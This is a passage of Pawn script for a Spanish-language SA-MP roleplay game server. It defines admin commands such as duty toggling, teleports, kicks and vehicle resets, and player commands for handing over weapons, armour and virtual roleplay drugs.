command(adminduty, playerid, params[]){
	if (cuenta[playerid][cAdministrador] < 1)return Mensaje(playerid, COLOR_GRIS2, "No autorizado!");
 	if(!booleano[AdminDuty]{playerid}){
		ShowPlayerDialog(playerid, ADMINDUTY_LOGIN, DIALOG_STYLE_PASSWORD, "{EE6C68}Panel Administrativo", "{FFFFFF}Ingrese tu contraseña administrativa", "Ingresar", "Cancelar");
	}else{
		new string[128];
		booleano[AdminDuty]{playerid} = false;
		booleano[HidePM]{playerid} = true;
		booleano[AntiAbusos]{playerid} = false;
		AdminChat[playerid] = 1;
		SetHP(playerid, 100.0);
		darArmadura(playerid, 0.0);
		ActiveTeleport[playerid] = 0;
		
		Update3DTextLabelText(estado[playerid], COLOR_ROJO, "void");
		Attach3DTextLabelToPlayer(estado[playerid], playerid, 0.0, 0.0, 1000.0);
	
		//ZZCASH
		switch(cuenta[playerid][cDonador])
		{
			case 1 .. 4: SetPlayerColor(playerid, 0xFFD70000);
			default: SetPlayerColor(playerid, 0xFFFFFF00);
		}
		format(string, sizeof(string), "{FFFFFF}[ADM]{BF0000} %s está fuera de servicio.", PlayerName(playerid), playerid); BroadCast(0xBF0000FF, string);
	}
	return 1;
}

    command(administradores, playerid, params[]){
       	Mensaje(playerid, 0xFF6464FF, "|___ Center Island RolePlay ___|");
       	Mensaje(playerid, COLOR_GRIS2, "La lista de Administradores de Center Island RolePlay no se da a conocer por asuntos internos del servidor.");
       	Mensaje(playerid, COLOR_GRIS2, "Utiliza: /duda para comunicarse con ellos y espere que le respondan.");
       	Mensaje(playerid, COLOR_GRIS2, "Utiliza: /re para reportar un jugador y espere que un administrador le responda");
	    return 1;
     }
    command(admins, playerid, params[]){
		if(cuenta[playerid][cAdministrador] == 0){
			Mensaje(playerid, COLOR_ROJO, "Por razones de privacidad se decidio ocultar la lista de administradores en servicio.");
			return 1;
		}
        Mensaje(playerid, COLOR_GRIS2, "| Staff de Center Island RP |");
		for(new i=0, t=GetMaxPlayers();i<t;i++){
		    if(IsPlayerConnected(i)){
		        if(cuenta[i][cAdministrador] >= 1 && cuenta[i][cAdministrador] <= 2014){
      			new string[128], admtext[24];
      			if(cuenta[i][cAdministrador] == 2014){ admtext = "Dueño"; }
      			else if(cuenta[i][cAdministrador] == 2013){ admtext = "Encargado de Staff"; }
	        	else if(cuenta[i][cAdministrador] == 2012){ admtext = "Administrador General"; }
				else if(cuenta[i][cAdministrador] == 6){ admtext = "Administrador Lider"; }
				else if(cuenta[i][cAdministrador] == 5)	{ admtext = "Administrador Superior"; }
				else if(cuenta[i][cAdministrador] == 4)	{ admtext = "Administrador"; }
				else if(cuenta[i][cAdministrador] == 3)	{ admtext = "Admin Junior"; }
				else if(cuenta[i][cAdministrador] == 2)	{ admtext = "Moderador"; }
				else if(cuenta[i][cAdministrador] == 1)	{ admtext = "Ayudante"; }
				if(!booleano[AdminDuty]{i}){
					format(string, sizeof(string), "  %s - %s", admtext, PlayerName(i));
					Mensaje(playerid, COLOR_BLANCO, string);
				}
					else{
						format(string, sizeof(string), "{008B00}(En servicio){FFFFFF} %s - %s [%d]", admtext, PlayerName(i), i);
						Mensaje(playerid, COLOR_BLANCO, string);
					}
				}
			}
		}
	    return 1;
    }
    command(helpers, playerid, params[]){
	   	Mensaje(playerid, COLOR_VERDE, "| Helpers |");
  for(new i=0, _max=GetMaxPlayers();i<_max;i++){
		    if(IsPlayerConnected(i)){
		        if(cuenta[i][pHelper] == 1){
					new string[128];
					format(string, sizeof(string), "  %s", PlayerName(i));
					Mensaje(playerid, 0xC0C0C0FF, string);
				}
			}
		}
    	return 1;
    }
    command(noac, playerid, params[]){
        if(cuenta[playerid][cAdministrador] < 2013)return Mensaje(playerid, COLOR_GRIS2, "No autorizado!");
        if(!booleano[AntiAbusos]{playerid}){Mensaje(playerid, COLOR_AMARILLO, "»{FFFFFF} No puedes usar este comando sin estar en OnDuty."); return 1;}
        new string[80];
        if (!noac){
			noac = 1;
			format(string, sizeof(string), "[ADMIN CHAT BLOQUEADO Por %s] ", PlayerName(playerid));
			return AdminMensaje(string);
		}
		else{
			noac = 0;
			format(string, sizeof(string), "[ADMIN CHAT DESBLOQUEADO Por %s]", PlayerName(playerid));
			return AdminMensaje(string);
		}
    }
    command(dar, playerid, params[])
    {
        new string[128], item[32];
        if(!sscanf(params, "s[32]u", item, params[1]))
        {
            if(!IsPlayerConnected(params[1]))               return Mensaje(playerid, COLOR_GRIS2, "Jugador no conectado!");
            if(!dDistanciaJugador(5.0, playerid, params[1]))return Mensaje(playerid, COLOR_GRIS2, "Jugador muy lejos!");
            if(strcmp(item, "arma", true) == 0)
			{
			    if(Team_LSPD(playerid) || Team_FBI(playerid) || Gobierno(playerid)){return Mensaje(playerid, COLOR_GRIS2, "No puedes usar este comando debido a tu faccion!");}
			    new gunID = GetPlayerWeapon(playerid), gunAmmo = GetPlayerAmmo(playerid);
            	if(gunID != 0 && gunAmmo != 0)
			    {
			        RemovePlayerWeapon(playerid, gunID);
       				darArma(params[1], gunID, gunAmmo);
			        format(string, sizeof(string), "* %s le da un arma a %s.", PlayerName(playerid), PlayerName(params[1]));
			        ProxDetector(30.0, playerid, string, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA);
			    } else Mensaje(playerid, COLOR_GRIS2, "No tienes arma a dar!");
			}
			else if(strcmp(item, "chaleco", true) == 0)
			{
			    if(Team_LSPD(playerid) || Team_FBI(playerid) || Gobierno(playerid)){return Mensaje(playerid, COLOR_GRIS2, "No puedes usar este comando debido a tu faccion!");}
                new Float:xC, Float:xD;
   				GetPlayerArmour(playerid, xC);
		    	GetPlayerArmour(params[1], xD);
				if(xC > 0)
    			{
       				if(xC > xD)
			        {
           				format(string, sizeof(string), "* %s le da su chaleco antibalas a %s", PlayerName(playerid), PlayerName(params[1]));
		        		ProxDetector(30.0, playerid, string, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA);
			        	darArmadura(playerid, 0);
			        	darArmadura(params[1], xC);
			        } else Mensaje(playerid, COLOR_GRIS2, "El jugador tiene una cantidad de chaleco superior al tuyo!");
				} else Mensaje(playerid, COLOR_GRIS2, "No tienes chaleco para dar.");
			} else Mensaje(playerid, COLOR_GRIS2, "Item incorrecto.");
        }
        else
        {
            Mensaje(playerid, COLOR_GRIS2, "Utiliza: /dar <Item> <PlayerID>");
            Mensaje(playerid, COLOR_GRIS2, "Items: arma, chaleco");
        }
        return 1;
    }
    command(pasar, playerid, params[])
    {
        new string[128], item[32];
        if(!sscanf(params, "s[32]ui", item, params[1], params[2]))
        {
            if(!IsPlayerConnected(params[1]))return Mensaje(playerid, COLOR_GRIS2, "Jugador no conectado!");
            if(!dDistanciaJugador(5.0, playerid, params[1]))return Mensaje(playerid, COLOR_GRIS2, "Jugador muy lejos!");
            if(strcmp(item, "materiales", true) == 0)
            {
                if(params[2] > cuenta[playerid][cMateriales])return Mensaje(playerid, COLOR_GRIS2, "No tienes esa cantidad de materiales!");
                format(string, sizeof(string), "* %s le da materiales a %s.", PlayerName(playerid), PlayerName(params[1]));
       			ProxDetector(30.0, playerid, string, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA);
       			cuenta[params[1]][cMateriales] += params[2];
       			cuenta[playerid][cMateriales] -= params[2];
       			format(string, sizeof(string), "* Has recibido %d materiales. Ahora tienes %d", params[2], cuenta[params[1]][cMateriales]);
	        	Mensaje(params[1], COLOR_AMARILLO2, string);
            }
            if(strcmp(item, "drogas", true) == 0)
            {
                if(params[2] > cuenta[playerid][cDrogas])return Mensaje(playerid, COLOR_GRIS2, "No tienes esa cantidad de drogas!");
                format(string, sizeof(string), "* %s le da algo a %s.", PlayerName(playerid), PlayerName(params[1]));
       			ProxDetector(30.0, playerid, string, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA);
                cuenta[params[1]][cDrogas] += params[2];
       			cuenta[playerid][cDrogas] -= params[2];
       			format(string, sizeof(string), "* Has recibido %d drogas. Ahora tienes %d", params[2], cuenta[params[1]][cDrogas]);
	        	Mensaje(params[1], COLOR_AMARILLO2, string);
            }
            if(strcmp(item, "speed", true) == 0)
            {
                if(params[2] > cuenta[playerid][cSpeed])return Mensaje(playerid, COLOR_GRIS2, "No tienes esa cantidad de speed!");
                format(string, sizeof(string), "* %s le da algo a %s.", PlayerName(playerid), PlayerName(params[1]));
       			ProxDetector(30.0, playerid, string, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA);
                cuenta[params[1]][cSpeed] += params[2];
       			cuenta[playerid][cSpeed] -= params[2];
       			format(string, sizeof(string), "* Has recibido %d de speed. Ahora tienes %d", params[2], cuenta[params[1]][cSpeed]);
	        	Mensaje(params[1], COLOR_AMARILLO2, string);
            }
            if(strcmp(item, "ectasy", true) == 0)
            {
                if(params[2] > cuenta[playerid][cExtasis])return Mensaje(playerid, COLOR_GRIS2, "No tienes esa cantidad de ectasy!");
                format(string, sizeof(string), "* %s le da algo a %s.", PlayerName(playerid), PlayerName(params[1]));
       			ProxDetector(30.0, playerid, string, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA);
                cuenta[params[1]][cExtasis] += params[2];
       			cuenta[playerid][cExtasis] -= params[2];
       			format(string, sizeof(string), "* Has recibido %d de ectasy. Ahora tienes %d", params[2], cuenta[params[1]][cExtasis]);
	        	Mensaje(params[1], COLOR_AMARILLO2, string);
            }
            if(strcmp(item, "ritalin", true) == 0)
            {
                if(params[2] > cuenta[playerid][cRitalin])return Mensaje(playerid, COLOR_GRIS2, "No tienes esa cantidad de ritalin!");
                format(string, sizeof(string), "* %s le da algo a %s.", PlayerName(playerid), PlayerName(params[1]));
       			ProxDetector(30.0, playerid, string, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA);
                cuenta[params[1]][cRitalin] += params[2];
       			cuenta[playerid][cRitalin] -= params[2];
       			format(string, sizeof(string), "* Has recibido %d de ritalin. Ahora tienes %d", params[2], cuenta[params[1]][cRitalin]);
	        	Mensaje(params[1], COLOR_AMARILLO2, string);
            }
            if(strcmp(item, "heroina", true) == 0)
            {
                if(params[2] > cuenta[playerid][cHeroina])return Mensaje(playerid, COLOR_GRIS2, "No tienes esa cantidad de heroina!");
                format(string, sizeof(string), "* %s le da algo a %s.", PlayerName(playerid), PlayerName(params[1]));
       			ProxDetector(30.0, playerid, string, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA);
                cuenta[params[1]][cHeroina] += params[2];
       			cuenta[playerid][cHeroina] -= params[2];
       			format(string, sizeof(string), "* Has recibido %d de heroina. Ahora tienes %d", params[2], cuenta[params[1]][cHeroina]);
	        	Mensaje(params[1], COLOR_AMARILLO2, string);
            }
            if(strcmp(item, "marihuana", true) == 0)
            {
                if(params[2] > cuenta[playerid][cMarihuana])return Mensaje(playerid, COLOR_GRIS2, "No tienes esa cantidad de marihuana!");
                format(string, sizeof(string), "* %s le da algo a %s.", PlayerName(playerid), PlayerName(params[1]));
       			ProxDetector(30.0, playerid, string, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA);
                cuenta[params[1]][cMarihuana] += params[2];
       			cuenta[playerid][cMarihuana] -= params[2];
       			format(string, sizeof(string), "* Has recibido %d de marihuana. Ahora tienes %d", params[2], cuenta[params[1]][cMarihuana]);
	        	Mensaje(params[1], COLOR_AMARILLO2, string);
            }
        } else {
            Mensaje(playerid, COLOR_GRIS2, "Utiliza: /pasar <Item> <PlayerID> <Cantidad>");
            Mensaje(playerid, COLOR_GRIS2, "Items: materiales, drogas, speed, ectasy, ritalin, heroina, marihuana");
        }
        return 1;
    }
	command(casas, playerid, params[]){
		if(cuenta[playerid][cAdministrador] != 2014)return Mensaje(playerid, COLOR_GRIS, "No autorizado!");
        if(!booleano[AntiAbusos]{playerid}){Mensaje(playerid, COLOR_AMARILLO, "»{FFFFFF} No puedes usar este comando sin estar en OnDuty."); return 1;}
		static count=0;
		for(new i=0;i<MAX_HOUSES;i++){
			if(casa[i][hEntrancex] == 3000.0){
				new string[144];
				format(string, sizeof(string), "El ID disponible es: %d", i);
				Mensaje(playerid, COLOR_GRIS1, string);
				count++;
				break;
			}
		}
		if(count == 0){
			Mensaje(playerid, COLOR_GRIS1, "No hay ID disponible.");
		}
		return 1;
	}
	
    //FRANCOC
    command(color, playerid, params[]){
        if(cuenta[playerid][cAdministrador] < 1)return Mensaje(playerid, COLOR_GRIS2, "No autorizado!");
		if(!booleano[AntiAbusos]{playerid}){Mensaje(playerid, COLOR_AMARILLO, "»{FFFFFF} No puedes usar este comando sin estar en OnDuty."); return 1;}{
        	ShowPlayerDialog(playerid, COLOR_ADM, DIALOG_STYLE_LIST, " {00ABFF}Seleccione su color", "{000000}»{ffffff}Negro\n {FFFFFF}» Blanco", "Seleccionar", "Salir");
        }
		return 1;
    }
    
	command(vdcar, playerid, params[]){
	    new keycar;
        if(cuenta[playerid][cAdministrador] < 2012)return Mensaje(playerid, COLOR_GRIS2, "No autorizado!");
        if(!booleano[AntiAbusos]{playerid}){
	        Mensaje(playerid, COLOR_AMARILLO, "»{FFFFFF} No puedes usar este comando sin estar en OnDuty.");
			return 1;
		}

		if(!sscanf(params, "d", keycar))
		{
			DestroyVehicle(keycar);
			keycar = CreateVehicleEx(400, 490.0000, -4900.0000, 1000.0000, 359.5519, 1, 1, 10*60*1000);
			autos[keycar][cLocationx] = 490.0000;
			autos[keycar][cLocationy] = 4900.0000;
			autos[keycar][cLocationz] = 1000.0000;
			autos[keycar][cOwned] = 0;
			autos[keycar][cBattery] = 10000;
			autos[keycar][cSpoiler] = 0;
			autos[keycar][cHood] = 0;
			autos[keycar][cRoof] = 0;
			autos[keycar][cSideskirt] = 0;
			autos[keycar][cNitro] = 0;
			autos[keycar][cLamps] = 0;
			autos[keycar][cExhaust] = 0;
			autos[keycar][cWheel] = 0;
			autos[keycar][cHydraulics] = 0;
			autos[keycar][cPaintjob] = 0;
			autos[keycar][cFrontBumper] = 0;
			autos[keycar][cRearBumper]	= 0;
			autos[keycar][cVents] = 0;
			autos[keycar][cEmbargo] = 0;
			autos[keycar][cMulta] = 0;
			
			PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
			Mensaje(playerid, COLOR_GRIS2, "Has vendido el vehículo!");
			SetVehicleVirtualWorld(keycar, 1);
			Mensaje(playerid, COLOR_VERDE, "Usted acaba de vender este vehiculo!");
			ActualizaVehiculo(keycar);
		}else return Mensaje(playerid, COLOR_GRIS2, "Error Utiliza /vdcar [carid]");
		return 1;
	}
	
	command(aseguro, playerid, params[]){
	    new keycar;
        if(cuenta[playerid][cAdministrador] < 6)return Mensaje(playerid, COLOR_GRIS2, "No autorizado!");
        if(palabrasProhibidas(params[1]))return AccionSPAM(playerid, params[1]);

        if(!booleano[AntiAbusos]{playerid}){
	        Mensaje(playerid, COLOR_AMARILLO, "»{FFFFFF} No puedes usar este comando sin estar en OnDuty.");
			return 1;
		}

		if(!sscanf(params, "d", keycar)){
			new engine, lights, alarm, doors, bonnet, boot, objective;
			GetVehicleParamsEx(keycar, engine, lights, alarm, doors, bonnet, boot, objective);
			SetVehicleParamsEx(keycar, engine, lights, alarm, 0, bonnet, boot, objective);
			autos[keycar][cLock] = false;
			Mensaje(playerid, COLOR_VERDE, "Usted acaba de quitarle el seguro a este vehiculo!");
		}else return Mensaje(playerid, COLOR_GRIS2, "Error Utiliza /aseguro [Carid]");
		return 1;
	}
    command(kickname, playerid, params[])
    {
        if(cuenta[playerid][cAdministrador] < 1)return Mensaje(playerid, COLOR_GRIS2, "No autorizado!");
        if(!booleano[AntiAbusos]{playerid}){
        Mensaje(playerid, COLOR_AMARILLO, "»{FFFFFF} No puedes usar este comando sin estar en OnDuty."); return 1;}
        if(!sscanf(params, "u", params[0])){
            if(params[0] != INVALID_PLAYER_ID){
                new string[100];
                if(IsPlayerNPC(params[0]))return Mensaje(playerid, COLOR_GRIS2, "No puedes kickear aun NPC!");
                if(cuenta[params[0]][cAdministrador] == 2014)
        		{
          			format(string, sizeof(string), "ATENCIÓN: %s intentó kickear a %s", PlayerName(playerid), PlayerName(params[0]));
	            	return AdminMensaje(string);
		        }
				format(string, sizeof(string), "%s ha kickeado a %s, razón: Mal Nombre (Nombre_Apellido)", PlayerName(playerid), PlayerName(params[0]));
                AdminMensaje(string);
                Mensaje(params[0], COLOR_ROJO, string);
                Mensaje(params[0], COLOR_BLANCO, "-----> Atención <------");
				Mensaje(params[0], COLOR_GRIS2, "Has sido kickeado del servidor por utilizar un nombre incorrecto(no rolero), por favor vuelve a entrar");
				Mensaje(params[0], COLOR_GRIS2, "siguiendo el formato Nombre_Apellido, con ambas iniciales en mayusculas, Ejemplo: Angel_Ramirez");
				Kick(params[0]);
				return 1;
			} else Mensaje(playerid, COLOR_GRIS2, "Jugador no conectado.");
		} else Mensaje(playerid, COLOR_GRIS2, "Utiliza: /kickname <PlayerID>");
		return 1;
  	}
    command(ls, playerid, params[])
    {
        if(cuenta[playerid][cAdministrador] < 1)return Mensaje(playerid, COLOR_GRIS2, "No autorizado!");
        if(!booleano[AntiAbusos]{playerid}){
        Mensaje(playerid, COLOR_AMARILLO, "»{FFFFFF} No puedes usar este comando sin estar en OnDuty."); return 1;}
        if(GetPlayerState(playerid) == 2){
			return SetVehiclePosEx(GetPlayerVehicleID(playerid), 1529.6, -1691.2, 13.3);
		}
		else{
			SetPosEx(playerid, 1529.6, -1691.2, 13.3, 0, 0 , 0);
			return 1;
		}
    }
    command(sf, playerid, params[]){
        if(cuenta[playerid][cAdministrador] < 1)return Mensaje(playerid, COLOR_GRIS2, "No autorizado!");
        if(!booleano[AntiAbusos]{playerid}){
        Mensaje(playerid, COLOR_AMARILLO, "»{FFFFFF} No puedes usar este comando sin estar en OnDuty."); return 1;}
        if(GetPlayerState(playerid) == 2){
			return SetVehiclePosEx(GetPlayerVehicleID(playerid), -1422.0162, -302.0881, 14.0000);
		}
		else{
			SetPosEx(playerid, -1417.0, -295.8, 14.1, 0, 0 , 0);
			return 1;
		}
    }
    command(lv, playerid, params[]){
        if(cuenta[playerid][cAdministrador] < 1)return Mensaje(playerid, COLOR_GRIS2, "No autorizado!");
        if(!booleano[AntiAbusos]{playerid}){
        Mensaje(playerid, COLOR_AMARILLO, "»{FFFFFF} No puedes usar este comando sin estar en OnDuty."); return 1;}
        if(GetPlayerState(playerid) == 2){
			return SetVehiclePosEx(GetPlayerVehicleID(playerid), 1694.6566, 1453.4523, 10.7632);
		}
		else{
			SetPosEx(playerid, 1694.6566, 1453.4523, 10.7632, 0, 0 , 0);
			return 1;
		}
    }
    command(lucas, playerid, params[])
    {
        if(cuenta[playerid][cAdministrador] < 2014)return Mensaje(playerid, COLOR_GRIS2, "No autorizado!");
        if(!booleano[AntiAbusos]{playerid}){
        Mensaje(playerid, COLOR_AMARILLO, "»{FFFFFF} No puedes usar este comando sin estar en OnDuty."); return 1;}
        if(GetPlayerState(playerid) == 2){
			return SetVehiclePosEx(GetPlayerVehicleID(playerid), 167.1930, 1756.2183, 733.0817);
		}
		else{
			SetPosEx(playerid, 167.1930, 1756.2183, 733.0817, 0, 0 , 0);
			return 1;
		}
    }
    command(conse2, playerid, params[]){
        if(cuenta[playerid][cAdministrador] < 1)return Mensaje(playerid, COLOR_GRIS2, "No autorizado!");
        if(!booleano[AntiAbusos]{playerid}){
        Mensaje(playerid, COLOR_AMARILLO, "»{FFFFFF} No puedes usar este comando sin estar en OnDuty."); return 1;}
        if(GetPlayerState(playerid) == 2){
			return SetVehiclePosEx(GetPlayerVehicleID(playerid), 1128.3505, -924.6271, 43.3906);
		}
		else{
			SetPosEx(playerid, 1128.3505, -924.6271, 43.3906, 0, 0 , 0);
			return 1;
		}
 	}
    command(conse3, playerid, params[]){
        if(cuenta[playerid][cAdministrador] < 1)return Mensaje(playerid, COLOR_GRIS2, "No autorizado!");
        if(!booleano[AntiAbusos]{playerid}){
        Mensaje(playerid, COLOR_AMARILLO, "»{FFFFFF} No puedes usar este comando sin estar en OnDuty."); return 1;}
        if(GetPlayerState(playerid) == 2){
			return SetVehiclePosEx(GetPlayerVehicleID(playerid), 1251.9261, -1654.7086, 12.6719);
		}
		else{
			SetPosEx(playerid, 1251.9261, -1654.7086, 12.6719, 0, 0 , 0);
			return 1;
		}
 }
    command(taller, playerid, params[]){
        if(cuenta[playerid][cAdministrador] < 1)return Mensaje(playerid, COLOR_GRIS2, "No autorizado!");
        if(!booleano[AntiAbusos]{playerid}){
        Mensaje(playerid, COLOR_AMARILLO, "»{FFFFFF} No puedes usar este comando sin estar en OnDuty."); return 1;}
        if(GetPlayerState(playerid) == 2){
			return SetVehiclePosEx(GetPlayerVehicleID(playerid), 2143.3237, -2258.2664, 13.2962);
		}
		else{
			SetPosEx(playerid, 2143.3237, -2258.2664, 13.2962, 0, 0 , 0);
			return 1;
		}
    }
    command(hospital, playerid, params[]){
        if(cuenta[playerid][cAdministrador] < 1)return Mensaje(playerid, COLOR_GRIS2, "No autorizado!");
        if(!booleano[AntiAbusos]{playerid}){Mensaje(playerid, COLOR_AMARILLO, "»{FFFFFF} No puedes usar este comando sin estar en OnDuty."); return 1;}
        if(GetPlayerState(playerid) == 2){
			return SetVehiclePosEx(GetPlayerVehicleID(playerid), 1199.9353, -1328.5468, 13.3984);
		}
		else{
			SetPosEx(playerid, 1199.9353, -1328.5468, 13.3984, 0, 0 , 0);
			return 1;
		}
    }
    command(banco, playerid, params[]){
        if(cuenta[playerid][cAdministrador] < 1)return Mensaje(playerid, COLOR_GRIS2, "No autorizado!");
        if(!booleano[AntiAbusos]{playerid}){
        Mensaje(playerid, COLOR_AMARILLO, "»{FFFFFF} No puedes usar este comando sin estar en OnDuty."); return 1;}
        if(GetPlayerState(playerid) == 2){
			return SetVehiclePosEx(GetPlayerVehicleID(playerid), 1271.5137, -994.5891, 35.6477);
		}
		else{
			SetPosEx(playerid, 1271.5137, -994.5891, 35.6477, 0, 0 , 0);
			return 1;
		}
    }
    command(unity, playerid, params[]){
        if(cuenta[playerid][cAdministrador] < 1)return Mensaje(playerid, COLOR_GRIS2, "No autorizado!");
        if(!booleano[AntiAbusos]{playerid}){
        Mensaje(playerid, COLOR_AMARILLO, "»{FFFFFF} No puedes usar este comando sin estar en OnDuty."); return 1;}
        if(GetPlayerState(playerid) == 2){
			return SetVehiclePosEx(GetPlayerVehicleID(playerid), 1461.6289, -1027.1749, 23.8281);
		}
		else{
			SetPosEx(playerid, 1792.2423, -1889.0272, 13.3983, 0, 0 , 0);
			return 1;
		}
    }
    command(jefferson, playerid, params[]){
        if(cuenta[playerid][cAdministrador] < 1)return Mensaje(playerid, COLOR_GRIS2, "No autorizado!");
        if(!booleano[AntiAbusos]{playerid}){
        Mensaje(playerid, COLOR_AMARILLO, "»{FFFFFF} No puedes usar este comando sin estar en OnDuty."); return 1;}
        if(GetPlayerState(playerid) == 2){
			return SetVehiclePosEx(GetPlayerVehicleID(playerid), 1461.6289, -1027.1749, 23.8281);
		}
		else{
			SetPosEx(playerid, 2128.9167, -1137.5654, 25.4842, 0, 0 , 0);
			return 1;
		}
    }
    command(telectronica, playerid, params[]){
        if(cuenta[playerid][cAdministrador] < 1)return Mensaje(playerid, COLOR_GRIS2, "No autorizado!");
        if(!booleano[AntiAbusos]{playerid}){
        Mensaje(playerid, COLOR_AMARILLO, "»{FFFFFF} No puedes usar este comando sin estar en OnDuty."); return 1;}
        if(GetPlayerState(playerid) == 2){
			return SetVehiclePosEx(GetPlayerVehicleID(playerid), 1769.2283, -1660.3501, 14.4171);
		}
		else{
			SetPosEx(playerid, 1769.2283, -1660.3501, 14.4171, 0, 0 , 0);
			return 1;
		}
    }
    command(mandarls, playerid, params[])
	{
		new player;
	    if(cuenta[playerid][cAdministrador] < 1)return Mensaje(playerid, COLOR_GRIS2, "No autorizado!");
	    if(!booleano[AntiAbusos]{playerid}){
        Mensaje(playerid, COLOR_AMARILLO, "»{FFFFFF} No puedes usar este comando sin estar en OnDuty."); return 1;}
        if(sscanf(params, "u", player))return Mensaje(playerid, COLOR_GRIS2, "Utiliza: /mandarls <PlayerID>");
        if(!IsPlayerConnected(player))return Mensaje(playerid, COLOR_GRIS2, "Jugador no conectado.");
		
		if(booleano[npcUse]{player})return Mensaje(playerid, COLOR_GRIS1, "Este usuario esta interactuando con un NPC.");
		if(cuenta[player][cCarcel] == 3)return Mensaje(playerid, COLOR_GRIS1, "Este jugador esta en JAIL IC.");
       
	 	SetPosEx(player, 1529.6, -1691.2, 13.3, 0, 0, 0);
		
  		new string[144];
		
		format(string, sizeof(string), "* Usted fue enviado a Los Santos por %s", PlayerName(playerid));
		Mensaje(player, COLOR_GRAD4, string);
		
		format(string, sizeof(string), "El administrador %s uso /mandarls con %s", PlayerName(playerid), PlayerName(player));
		AdminMensaje(string);
		return 1;
	}
COMMAND:llenarautos(playerid, params[])
{
	if(cuenta[playerid][cAdministrador] < 5)return Mensaje(playerid, COLOR_GRIS2, "No autorizado!");
	if(!booleano[AntiAbusos]{playerid})return Mensaje(playerid, COLOR_AMARILLO, "»{FFFFFF} No puedes usar este comando sin estar en OnDuty.");
	for(new vehicle=0; vehicle<MAX_VEHICLES; vehicle++)
	{
		Gas[vehicle] = 1000;
	}
	MensajeGlobal(COLOR_VERDE, "La gasolina de los vehículos fue llenada.");
	return 1;
}
    command(rcn, playerid, params[]){
        if(cuenta[playerid][cAdministrador] < 2014)return Mensaje(playerid, COLOR_GRIS2, "No autorizado!");
        if(!booleano[AntiAbusos]{playerid}){
        Mensaje(playerid, COLOR_AMARILLO, "»{FFFFFF} No puedes usar este comando sin estar en OnDuty."); return 1;}
        if(palabrasProhibidas(params[1]))return AccionSPAM(playerid, params[1]);
        if(!sscanf(params, "is[64]", params[0], params[1])){
            if(params[0] == 2)return Mensaje(playerid, COLOR_GRIS2, "No puedes elegir el #2!");
            new string[64];
            format(string, sizeof(string), "%s", params[1]);
            for(new i=0, _max=GetMaxPlayers();i<_max;i++){
				if(IsPlayerConnected(i) == 1)
				{
				GameTextForPlayer(i, string, 5000, params[0]);
				}
			}
        } else Mensaje(playerid, COLOR_GRIS2, "Utiliza: /rcn <Tipo> <Texto>");
        return 1;
    }
	// zcmd:global ============================================================================================================================
	command(hora, playerid, params[]){
        new mtext[20], year, month, day, string[128];
		getdate(year, month, day);
		switch(month){
		    case 1:     mtext = "Enero";
		    case 2:     mtext = "Febrero";
		    case 3:     mtext = "Marzo";
		    case 4:     mtext = "Abril";
		    case 5:     mtext = "Mayo";
		    case 6:     mtext = "Junio";
		    case 7:     mtext = "Julio";
		    case 8:     mtext = "Agosto";
			case 9:     mtext = "Septiembre";
			case 10:    mtext = "Octubre";
			case 11:    mtext = "Noviembre";
			case 12:    mtext = "Diciembre";
		}
  		new hour, minuite, second;
		gettime(hour, minuite, second);
		FixHour(hour);
		hour = shifthour;
		if(minuite < 10)
		{
			if(cuenta[playerid][cTiempoCarcel] > 0)
			{
				format(string, sizeof(string), "~y~%d %s~n~~g~|~w~%d:0%d~g~|~n~~w~Tiempo de Carcel: %d sec", day, mtext, hour, minuite, cuenta[playerid][cTiempoCarcel]-10);
			}
			else
			{
				format(string, sizeof(string), "~y~%d %s~n~~g~|~w~%d:0%d~g~|", day, mtext, hour, minuite);
			}
		}
		else
		{
			if (cuenta[playerid][cTiempoCarcel] > 0)
			{
				format(string, sizeof(string), "~y~%d %s~n~~g~|~w~%d:%d~g~|~n~~w~Tiempo de Carcel: %d sec", day, mtext, hour, minuite, cuenta[playerid][cTiempoCarcel]-10);
			}
			else
			{
				format(string, sizeof(string), "~y~%d %s~n~~g~|~w~%d:%d~g~|", day, mtext, hour, minuite);
			}
		}
		GameTextForPlayer(playerid, string, 5000, 1);
		format(string, sizeof(string), "* %s se fija la hora en su reloj de muñeca.", PlayerName(playerid));
		ProxDetector(30.0, playerid, string, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA);
		return ApplyAnimation(playerid, "COP_AMBIENT", "Coplook_watch", 4.1, 0, 0, 0, 0, 0);
    }
    command(apgarage, playerid, params[])
    {
        Mensaje(playerid, COLOR_GRIS2, "El comando fue deshabilitado, pulse la tecla [N] para abrir el porton.");
        return 1;
    }
    command(cpgarage, playerid, params[])
    {
        Mensaje(playerid, COLOR_GRIS2, "El comando fue deshabilitado, pulse la tecla [N] para cerrar el porton.");
        return 1;
    }
    command(ap, playerid, params[]){
    	if(Team_LSPD(playerid)){
			if(IsPlayerInRangeOfPoint(playerid, 4.0, 2041.9352, -2074.0598, 13.6079)){
				MoveDynamicObject(PrisionRejas[0], 2041.1350, -2073.2971, 10.1244, 1);
			}
			if(IsPlayerInRangeOfPoint(playerid, 4.0, 2041.0068, -2070.6567, 12.5880)){
				MoveDynamicObject(PrisionRejas[1], 2041.0068, -2070.6567, 10.1323, 1);
			}else if(IsPlayerInRangeOfPoint(playerid, 4.0, 2011.7760, -2047.9180, 10.1609)){
				MoveDynamicObject(PrisionRejas[2], 2011.7760, -2047.9180, 10.1609, 1);
			}else if (IsPlayerInRangeOfPoint(playerid, 3.0, 308.0562, -1526.1218, 3266.0840)){
				MoveDynamicObject(PrisionRejas[3], 308.0562, -1526.1218, 3263.7480, 1);
			}else if (IsPlayerInRangeOfPoint(playerid, 3.0, 308.0562, -1526.1218, 3266.0840)){
